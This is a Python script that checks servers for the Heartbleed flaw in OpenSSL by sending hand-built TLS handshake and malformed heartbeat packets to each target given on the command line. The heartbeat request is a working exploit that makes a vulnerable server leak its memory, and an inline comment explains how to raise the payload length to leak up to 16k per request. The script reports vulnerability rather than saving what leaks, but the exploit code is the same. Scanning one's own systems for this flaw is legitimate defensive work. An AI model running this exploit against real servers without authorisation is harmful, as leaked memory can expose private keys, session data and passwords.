#!/usr/bin/env python3
import sys
import struct
import socket
import binascii
from logging import info, warn, error, debug

tls_versions = {0x01: 'TLSv1.0', 0x02: 'TLSv1.1', 0x03: 'TLSv1.2'}


def build_client_hello(tls_ver):
    client_hello = [
        # TLS header ( 5 bytes)
        0x16,               # Content type (0x16 for handshake)
        0x03, tls_ver,         # TLS Version
        0x00, 0xdc,         # Length
        # Handshake header
        0x01,               # Type (0x01 for ClientHello)
        0x00, 0x00, 0xd8,   # Length
        0x03, tls_ver,         # TLS Version
        # Random (32 byte)
        0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
        0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
        0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
        0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
        0x00,               # Session ID length
        0x00, 0x66,         # Cipher suites length
        # Cipher suites (51 suites)
        0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
        0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
        0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
        0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
        0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
        0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
        0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
        0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
        0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
        0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
        0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
        0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
        0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
        0x01,               # Compression methods length
        0x00,               # Compression method (0x00 for NULL)
        0x00, 0x49,         # Extensions length
        # Extension: ec_point_formats
        0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
        # Extension: elliptic_curves
        0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
        0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
        0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
        0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
        0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
        0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
        0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
        # Extension: SessionTicket TLS
        0x00, 0x23, 0x00, 0x00,
        # Extension: Heartbeat
        0x00, 0x0f, 0x00, 0x01, 0x01
    ]
    return client_hello


def build_heartbeat(tls_ver):
    heartbeat = [
        0x18,       # Content Type (Heartbeat)
        0x03, tls_ver,  # TLS version
        0x00, 0x03,  # Length
        # Payload
        0x01,        # Type (Heartbeat Request)
        0x10, 0x00   # Payload length - this is the amount of memory we want to leak. set it to e.g. 0x40,0x00 to get 16k of server memory, has to be 4k aligned
        # 0xFF, 0xFF   # Payload length - this is the amount of memory we want to leak. set it to e.g. 0x40,0x00 to get 16k of server memory, has to be 4k aligned
    ]
    return heartbeat


def rcv_tls_record(s):
    try:
        tls_header = s.recv(5)
        if not tls_header or len(tls_header) < 5:
            error("Unexpected EOF (header): {}".format(tls_header))
            raise(Exception("Server returned not enough bytes"))
        typ, ver, length = struct.unpack('>BHH', tls_header)
        message = b''
        while len(message) != length:
            message += s.recv(length-len(message))
        if not message:
            error('Unexpected EOF (message)')
            return
        debug('Received record: type = {}, version = {}, length = {}, recordtype = {}'.format(
            typ, hex(ver), length, message[0]))
        return typ, ver, message
    except Exception as e:
        print('Exception', e)
        return None, None, None


def measure_heartbleed(host, port:int=443):
    for num, tlsver in tls_versions.items():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(5)
            s.connect((host, port))
            debug('Sending ClientHello for {}'.format(tlsver))
            s.send(bytes(build_client_hello(num)))
            debug('Waiting for Server Hello...')

            typ, ver, message = rcv_tls_record(s)
            if typ != 22:
                debug(f"Instead of {tlsver} Handshake we got {typ}")
                continue
            # handshake,serverhellodone
            while typ == 22 and message[0] != 0x0E:
                typ, ver, message = rcv_tls_record(s)

            if not typ or typ == 21:
                error(
                    'Server closed connection without sending ServerHello for {}'.format(tlsver))
                break
            if typ == 22 and message[0] == 0x0E:
                debug('Reveiced ServerHello for {}'.format(tlsver))
                debug('Sending heartbeat request...')
                s.send(bytes(build_heartbeat(num)))

                typ, ver, message = rcv_tls_record(s)
                if not typ or typ == 21:
                    error(
                        'No heartbeat response received, server likely not vulnerable')
                    return False
                if typ == 24:
                    debug('Received heartbeat response:')
                    if len(message) > 3:
                        # print(message)
                        info('Server is vulnerable!')
                        return True
                    else:
                        error(
                            'Server processed malformed heartbeat, but did not return any extra data.')
                        return False
                break  # test conducted, no need to test other TLS versions
    return False


if __name__ == '__main__':
    from camlog import *
    import logging
    setuplogger(logging.ERROR)
    import sys
    for target in sys.argv[1:]:
        if not ':' in target:
            target += ':443'
        host, port = target.split(':')
        port = int(port)
        measure_heartbleed(host, port)
